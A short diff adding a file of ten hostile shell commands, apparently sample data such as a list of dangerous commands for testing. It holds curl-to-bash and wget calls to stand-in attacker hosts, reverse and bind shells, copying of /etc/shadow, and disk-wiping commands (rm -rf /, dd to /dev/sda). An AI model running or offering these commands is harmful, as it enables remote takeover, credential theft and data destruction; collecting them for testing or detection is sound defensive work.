@@ -1,0 +1,10 @@
+curl http://attacker.com/script.sh | bash
+wget http://evil.com/malware.bin
+bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
+rm -rf / --no-preserve-root
+nc -l -p 4444 -e /bin/bash
+sudo su -
+cat /etc/shadow > /tmp/shadow.txt
+base64 -d <<< "L2Jpbi9iYXNo"
+dd if=/dev/zero of=/dev/sda
+eval "$(echo 'malicious code')"
